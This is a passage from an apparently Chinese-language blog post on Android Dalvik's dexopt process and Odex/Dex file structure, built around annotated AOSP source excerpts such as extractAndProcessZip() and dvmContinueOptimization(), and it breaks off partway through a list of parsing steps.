<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassLookup</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> size;         <span class="comment">// 总大小</span></span><br><span class="line">    <span class="keyword">int</span> numEntries;   <span class="comment">// 表的项数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	    u4 classDescriptorHash;     <span class="comment">// 类描述符的哈希值</span></span><br><span class="line">	    <span class="keyword">int</span> classDescriptorOffset;  <span class="comment">// Dex文件中该类描述符的偏移位置</span></span><br><span class="line">	    <span class="keyword">int</span> classDefOffset;         <span class="comment">// Dex文件中该类定义偏移位置</span></span><br><span class="line">    &#125; table[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>numEntries是通过<code>dexRoundUpPower2()</code>（用于求比一个数大的最小的2的整数次幂，如数为6，结果为8，降低了哈希冲突率）函数生成。</p>
<h3 id="函数执行流程"><a href="#函数执行流程" class="headerlink" title="函数执行流程"></a>函数执行流程</h3><p>PackageManagerService-&gt;Installer-&gt;installd-&gt;do_dexopt-&gt;dexopt-&gt;run_dexopt-&gt;/system/bin/dexopt<br><code>/system/bin/dexopt</code>的代码位于dalvik/dexopt/OptMain.cpp文件，其中<code>extractAndProcessZip()</code>是优化机制的主控程序。<br><strong>代码清单</strong> dalvik/dexopt/OptMain.cpp: extractAndProcessZip()</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Extract &quot;classes.dex&quot; from zipFd into &quot;cacheFd&quot;, leaving a little space</span></span><br><span class="line"><span class="comment"> * up front for the DEX optimization header.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">extractAndProcessZip</span><span class="params">(<span class="keyword">int</span> zipFd, <span class="keyword">int</span> cacheFd,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* debugFileName, <span class="keyword">bool</span> isBootstrap, <span class="keyword">const</span> <span class="keyword">char</span>* bootClassPath,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* dexoptFlagStr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ZipArchive zippy; <span class="comment">// 用于描述ZIP压缩文件的数据结构</span></span><br><span class="line">    ZipEntry zipEntry; <span class="comment">// 用于表示一个ZIP入口</span></span><br><span class="line">    <span class="keyword">size_t</span> uncompLen;</span><br><span class="line">    <span class="keyword">long</span> modWhen, crc32;</span><br><span class="line">    <span class="keyword">off_t</span> dexOffset; <span class="comment">// 用于表示在Odex文件中，原Dex文件的起始地址</span></span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> dexoptFlags = <span class="number">0</span>;        <span class="comment">/* bit flags, from enum DexoptFlags */</span></span><br><span class="line">	<span class="comment">// 设置默认的优化模式</span></span><br><span class="line">    DexClassVerifyMode verifyMode = VERIFY_MODE_ALL;</span><br><span class="line">    DexOptimizerMode dexOptMode = OPTIMIZE_MODE_VERIFIED;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;zippy, <span class="number">0</span>, <span class="keyword">sizeof</span>(zippy));</span><br><span class="line">    <span class="comment">/* make sure we&#x27;re still at the start of an empty file */</span></span><br><span class="line">    <span class="keyword">if</span> (lseek(cacheFd, <span class="number">0</span>, SEEK_END) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;DexOptZ: new cache file &#x27;%s&#x27; is not empty&quot;</span>, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Write a skeletal DEX optimization header.  We want the classes.dex</span></span><br><span class="line"><span class="comment">     * to come just after it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    err = dexOptCreateEmptyHeader(cacheFd);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    <span class="comment">/* record the file position so we can get back here later */</span></span><br><span class="line">	<span class="comment">// 取得Odex文件中原Dex文件的起始位置，实际就是一个Odex文件头部的长度</span></span><br><span class="line">    dexOffset = lseek(cacheFd, <span class="number">0</span>, SEEK_CUR);</span><br><span class="line">    <span class="keyword">if</span> (dexOffset &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Open the zip archive, find the DEX entry.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipPrepArchive(zipFd, debugFileName, &amp;zippy) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">&quot;DexOptZ: unable to open zip archive &#x27;%s&#x27;&quot;</span>, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 获取目标Dex文件的解压入口</span></span><br><span class="line">    zipEntry = dexZipFindEntry(&amp;zippy, kClassesDex);</span><br><span class="line">    <span class="keyword">if</span> (zipEntry == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">&quot;DexOptZ: zip archive &#x27;%s&#x27; does not include %s&quot;</span>,</span><br><span class="line">            debugFileName, kClassesDex);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Extract some info about the zip entry.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipGetEntryInfo(&amp;zippy, zipEntry, <span class="literal">NULL</span>, &amp;uncompLen, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">            &amp;modWhen, &amp;crc32) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGW(<span class="string">&quot;DexOptZ: zip archive GetEntryInfo failed on %s&quot;</span>, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    uncompLen = uncompLen;</span><br><span class="line">    modWhen = modWhen;</span><br><span class="line">    crc32 = crc32;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Extract the DEX data into the cache file at the current offset.</span></span><br><span class="line"><span class="comment">	 * 从ZIP文件将目标Dex文件解压出来，并写入cacheFd所指文件，此时cacheFd所指文件非空，</span></span><br><span class="line"><span class="comment">	 * 包括一个Odex文件头部加上一个原始的Dex文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipExtractEntryToFile(&amp;zippy, zipEntry, cacheFd) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">&quot;DexOptZ: extraction of %s from %s failed&quot;</span>,</span><br><span class="line">            kClassesDex, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Parse the options. */</span></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * 入口参数dexoptFlagStr，对验证优化需求进行分析，dexoptFlagStr实际上是一个字符串，</span></span><br><span class="line"><span class="comment">	 * 记录了验证优化的要求</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="keyword">if</span> (dexoptFlagStr[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* opc;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* val;</span><br><span class="line">		<span class="comment">// 设置验证模式</span></span><br><span class="line">        opc = <span class="built_in">strstr</span>(dexoptFlagStr, <span class="string">&quot;v=&quot;</span>);      <span class="comment">/* verification */</span></span><br><span class="line">        <span class="keyword">if</span> (opc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (*(opc+<span class="number">2</span>)) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:   verifyMode = VERIFY_MODE_NONE;          <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:   verifyMode = VERIFY_MODE_REMOTE;        <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:   verifyMode = VERIFY_MODE_ALL;           <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:                                            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// 设置优化模式</span></span><br><span class="line">        opc = <span class="built_in">strstr</span>(dexoptFlagStr, <span class="string">&quot;o=&quot;</span>);      <span class="comment">/* optimization */</span></span><br><span class="line">        <span class="keyword">if</span> (opc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (*(opc+<span class="number">2</span>)) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:   dexOptMode = OPTIMIZE_MODE_NONE;        <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:   dexOptMode = OPTIMIZE_MODE_VERIFIED;    <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:   dexOptMode = OPTIMIZE_MODE_ALL;         <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:   dexOptMode = OPTIMIZE_MODE_FULL;        <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:                                            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        opc = <span class="built_in">strstr</span>(dexoptFlagStr, <span class="string">&quot;m=y&quot;</span>);     <span class="comment">/* register map */</span></span><br><span class="line">        <span class="keyword">if</span> (opc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            dexoptFlags |= DEXOPT_GEN_REGISTER_MAPS;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        opc = <span class="built_in">strstr</span>(dexoptFlagStr, <span class="string">&quot;u=&quot;</span>);      <span class="comment">/* uniprocessor target */</span></span><br><span class="line">        <span class="keyword">if</span> (opc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (*(opc+<span class="number">2</span>)) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;y&#x27;</span>:   dexoptFlags |= DEXOPT_UNIPROCESSOR;     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:   dexoptFlags |= DEXOPT_SMP;              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:                                            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Prep the VM and perform the optimization.</span></span><br><span class="line"><span class="comment">	 * 完成了原Dex文件的提取以及验证优化选项的设置，即可以开始真正的优化工作，需要</span></span><br><span class="line"><span class="comment">	 * 初始化一个虚拟机专门用于验证优化工作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dvmPrepForDexOpt(bootClassPath, dexOptMode, verifyMode,</span><br><span class="line">            dexoptFlags) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;DexOptZ: VM init failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//vmStarted = 1;</span></span><br><span class="line">    <span class="comment">/* do the optimization */</span></span><br><span class="line">    <span class="keyword">if</span> (!dvmContinueOptimization(cacheFd, dexOffset, uncompLen, debugFileName,</span><br><span class="line">            modWhen, crc32, isBootstrap))</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;Optimization failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* we don&#x27;t shut the VM down -- process is about to exit */</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">bail:</span><br><span class="line">    dexZipCloseArchive(&amp;zippy);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>代码清单</strong> dalvik/vm/analysis/DexPrepare.cpp: dvmContinueOptimization()</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dvmContinueOptimization</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">off_t</span> dexOffset, <span class="keyword">long</span> dexLength,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* fileName, u4 modWhen, u4 crc, <span class="keyword">bool</span> isBootstrap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 声明相关中间变量</span></span><br><span class="line">    DexClassLookup* pClassLookup = <span class="literal">NULL</span>; <span class="comment">// 类索引信息</span></span><br><span class="line">    RegisterMapBuilder* pRegMapBuilder = <span class="literal">NULL</span>; <span class="comment">// 寄存器映射关系信息</span></span><br><span class="line"></span><br><span class="line">    assert(gDvm.optimizing);</span><br><span class="line">    ALOGV(<span class="string">&quot;Continuing optimization (%s, isb=%d)&quot;</span>, fileName, isBootstrap);</span><br><span class="line"></span><br><span class="line">    assert(dexOffset &gt;= <span class="number">0</span>); <span class="comment">// 判断输入文件长度非0</span></span><br><span class="line">    <span class="comment">// 对目标文件进行合法性检验，Dex文件长度不能小于其文件头长度</span></span><br><span class="line">    <span class="keyword">if</span> (dexLength &lt; (<span class="keyword">int</span>) <span class="keyword">sizeof</span>(DexHeader)) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;too small to be DEX&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Odex文件中的Dex文件的起始偏移量不能小于Odex文件头的长度</span></span><br><span class="line">    <span class="keyword">if</span> (dexOffset &lt; (<span class="keyword">int</span>) <span class="keyword">sizeof</span>(DexOptHeader)) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;not enough room for opt header&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 将fd所指文件映射到某一内存位置，该位置的起始地址为mapAddr，其大小</span></span><br><span class="line"><span class="comment">         * 就为fd所指文件大小，即一个Odex文件头部加上一个Dex文件长度</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        mapAddr = mmap(<span class="literal">NULL</span>, dexOffset + dexLength, PROT_READ|PROT_WRITE,</span><br><span class="line">                    MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (mapAddr == MAP_FAILED) &#123;</span><br><span class="line">            ALOGE(<span class="string">&quot;unable to mmap DEX cache: %s&quot;</span>, strerror(errno));</span><br><span class="line">            <span class="keyword">goto</span> bail;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 设置相关的验证优化选项</span></span><br><span class="line">        <span class="keyword">bool</span> doVerify, doOpt;</span><br><span class="line">        <span class="keyword">if</span> (gDvm.classVerifyMode == VERIFY_MODE_NONE) &#123;</span><br><span class="line">            doVerify = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (gDvm.classVerifyMode == VERIFY_MODE_REMOTE) &#123;</span><br><span class="line">            doVerify = !gDvm.optimizingBootstrapClass;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">/*if (gDvm.classVerifyMode == VERIFY_MODE_ALL)*/</span> &#123;</span><br><span class="line">            doVerify = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (gDvm.dexOptMode == OPTIMIZE_MODE_NONE) &#123;</span><br><span class="line">            doOpt = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (gDvm.dexOptMode == OPTIMIZE_MODE_VERIFIED ||</span><br><span class="line">                   gDvm.dexOptMode == OPTIMIZE_MODE_FULL) &#123;</span><br><span class="line">            doOpt = doVerify;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">/*if (gDvm.dexOptMode == OPTIMIZE_MODE_ALL)*/</span> &#123;</span><br><span class="line">            doOpt = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 重写文件，主要包括：字符顺序调整、结构重新对齐、类验证、字节码优化</span></span><br><span class="line">        success = rewriteDex(((u1*) mapAddr) + dexOffset, dexLength,</span><br><span class="line">                    doVerify, doOpt, &amp;pClassLookup, <span class="literal">NULL</span>);</span><br><span class="line">        ...</span><br><span class="line">    <span class="comment">// 对文件进行8字节对齐</span></span><br><span class="line">    <span class="keyword">off_t</span> depsOffset, optOffset, endOffset, adjOffset;</span><br><span class="line">    <span class="keyword">int</span> depsLength, optLength;</span><br><span class="line">    u4 optChecksum;</span><br><span class="line"></span><br><span class="line">    depsOffset = lseek(fd, <span class="number">0</span>, SEEK_END); <span class="comment">// 取得fd所指文件大小</span></span><br><span class="line">    <span class="keyword">if</span> (depsOffset &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;lseek to EOF failed: %s&quot;</span>, strerror(errno));</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// depsOffset是dependency list起始地址</span></span><br><span class="line">    adjOffset = (depsOffset + <span class="number">7</span>) &amp; ~(<span class="number">0x07</span>); <span class="comment">// 8字节对齐，adjOffset&gt;=depsOffset</span></span><br><span class="line">    <span class="keyword">if</span> (adjOffset != depsOffset) &#123;</span><br><span class="line">        ALOGV(<span class="string">&quot;Adjusting deps start from %d to %d&quot;</span>,</span><br><span class="line">            (<span class="keyword">int</span>) depsOffset, (<span class="keyword">int</span>) adjOffset);</span><br><span class="line">        depsOffset = adjOffset;</span><br><span class="line">        lseek(fd, depsOffset, SEEK_SET);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 写入依赖库信息</span></span><br><span class="line">    <span class="keyword">if</span> (writeDependencies(fd, modWhen, crc) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">&quot;Failed writing dependencies&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算依赖库长度，调整优化信息的起始地址8字节对齐</span></span><br><span class="line">    optOffset = lseek(fd, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    depsLength = optOffset - depsOffset;</span><br><span class="line"></span><br><span class="line">    adjOffset = (optOffset + <span class="number">7</span>) &amp; ~(<span class="number">0x07</span>);</span><br><span class="line">    <span class="keyword">if</span> (adjOffset != optOffset) &#123;</span><br><span class="line">        ALOGV(<span class="string">&quot;Adjusting opt start from %d to %d&quot;</span>,</span><br><span class="line">            (<span class="keyword">int</span>) optOffset, (<span class="keyword">int</span>) adjOffset);</span><br><span class="line">        optOffset = adjOffset;</span><br><span class="line">        lseek(fd, optOffset, SEEK_SET);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 写入其他优化信息，包括类索引以及寄存器映射关系</span></span><br><span class="line">    <span class="keyword">if</span> (!writeOptData(fd, pClassLookup, pRegMapBuilder)) &#123;</span><br><span class="line">        ALOGW(<span class="string">&quot;Failed writing opt data&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 对Odex文件的头部内容进行修正</span></span><br><span class="line">    DexOptHeader optHdr;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;optHdr, <span class="number">0xff</span>, <span class="keyword">sizeof</span>(optHdr));</span><br><span class="line">    <span class="built_in">memcpy</span>(optHdr.magic, DEX_OPT_MAGIC, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(optHdr.magic+<span class="number">4</span>, DEX_OPT_MAGIC_VERS, <span class="number">4</span>);</span><br><span class="line">    optHdr.dexOffset = (u4) dexOffset;</span><br><span class="line">    optHdr.dexLength = (u4) dexLength;</span><br><span class="line">    optHdr.depsOffset = (u4) depsOffset;</span><br><span class="line">    optHdr.depsLength = (u4) depsLength;</span><br><span class="line">    optHdr.optOffset = (u4) optOffset;</span><br><span class="line">    optHdr.optLength = (u4) optLength;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

<h2 id="Dex文件的解析"><a href="#Dex文件的解析" class="headerlink" title="Dex文件的解析"></a>Dex文件的解析</h2><h3 id="DexFile数据结构"><a href="#DexFile数据结构" class="headerlink" title="DexFile数据结构"></a>DexFile数据结构</h3><p>Dex文件解析的重要目标是为Dex文件生成一个DexFile数据结构。<br>DexFile结构体定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexFile</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> DexOptHeader* pOptHeader;      <span class="comment">// 优化数据头</span></span><br><span class="line">    <span class="keyword">const</span> DexHeader* pHeader;            <span class="comment">// Dex文件头</span></span><br><span class="line">    <span class="keyword">const</span> DexStringId * pStringIds;      <span class="comment">// 指向字符串索引区</span></span><br><span class="line">    <span class="keyword">const</span> DexTypeId* pTypeIds;           <span class="comment">// 指向类型索引区</span></span><br><span class="line">    <span class="keyword">const</span> DexFieldId* pFieldIds;         <span class="comment">// 指向字段索引区</span></span><br><span class="line">    <span class="keyword">const</span> DexMethodId* pMethodIds;       <span class="comment">// 指向方法索引区</span></span><br><span class="line">    <span class="keyword">const</span> DexProtoId* pProtoIds;         <span class="comment">// 指向原型索引区</span></span><br><span class="line">    <span class="keyword">const</span> DexClassDef* pClassDefs;       <span class="comment">// 指向类定义区</span></span><br><span class="line">    <span class="keyword">const</span> DexLink* pLinkData;            <span class="comment">// 指向链接数据区</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">const</span> DexClassLookup* pClassLookup;  <span class="comment">// 类索引</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">void</span>* pRegisterMapPool;        <span class="comment">// 寄存器映射关系</span></span><br><span class="line">    <span class="keyword">const</span> u1* baseAddr;                  <span class="comment">// 基地址</span></span><br><span class="line">    <span class="keyword">int</span> overhead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Dex文件解析流程"><a href="#Dex文件解析流程" class="headerlink" title="Dex文件解析流程"></a>Dex文件解析流程</h3><ol>
<li>对Odex文件进行完整性校验</li>
<li>解析Odex文件中的优化数据</li>
